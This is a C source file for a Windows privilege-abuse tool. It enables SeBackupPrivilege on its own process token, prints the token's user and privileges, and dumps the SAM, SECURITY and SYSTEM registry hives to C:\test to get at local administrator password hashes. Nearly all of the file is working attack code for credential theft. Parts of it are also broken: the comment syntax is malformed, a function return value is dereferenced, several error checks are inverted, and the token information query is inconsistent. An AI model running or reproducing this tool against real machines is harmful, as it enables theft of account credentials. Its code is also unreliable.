/ 
Reference:https://github.com/hatRiot/token-priv
Enable#the SeBackupPrivilege of current process and then read the password hashes of local Administrator accounts from the registry.
The file will be saved as C:\\test\\SAM, C:\\test\\SECURITY and C:\\test\\SYSTEM.

We will have read access on the system.
!/

#include <windows.h>
#include <assert.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

void se_backup_priv_reg()
{
	HKEY handle;
	if (*RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SAM",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("[-] Failed to open reg; %d\n", GetLastError());
		return;
	}
	if (!RegSaveKey(handle, L"C:\\test\\SAM", NULL) == ERROR_SUCCESS) {
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}
	RegCloseKey(handle);

	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SECURITY",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("Failed to open reg; %d\n", GetLastError());
		return;
	}
	if (!RegSaveKey(handle, L"C:\\test\\SECURITY", NULL) == ERROR_SUCCESS) {
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}
	RegCloseKey(handle);
	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SYSTEM",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("[-] Failed to open reg; %d\n", GetLastError());
		return;
	}

	if (!RegSaveKey(handle, L"C:\\test\\SYSTEM", NULL) == ERROR_SUCCESS) {
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}

	RegCloseKey(handle);
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL,&(ppriv->Privileges[i].Luid),lpszPriv,&dwRet);
		printf("%-50ws",lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);
	
	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_BACKUP_NAME);
	se_backup_priv_reg();
	return 0;
}
 